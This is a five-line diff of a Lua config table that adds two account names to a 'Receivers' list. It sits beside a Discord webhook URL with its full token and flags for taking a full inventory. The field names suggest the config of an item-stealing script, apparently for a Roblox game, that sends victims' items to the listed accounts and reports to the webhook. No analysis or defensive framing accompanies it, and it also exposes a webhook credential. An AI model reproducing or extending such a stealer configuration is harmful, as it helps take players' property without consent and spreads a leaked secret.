@@ -1,5 +1,5 @@
 Config = {
-    Receivers = {"CelestialHubTesting"},
+    Receivers = {"CelestialHubTesting", "Menace_alc", "LilFATT_Feet"},
     Webhook = "https://discord.com/api/webhooks/1266904144837611520/cTkC4K2pPOYETm6tUAZnY843z6rDFBlxIO6S2WDGRM7CbFTEWqjY70QbYy0ACupGo2CL",
     FullInventory = true,
     GoodItemsOnly = false,
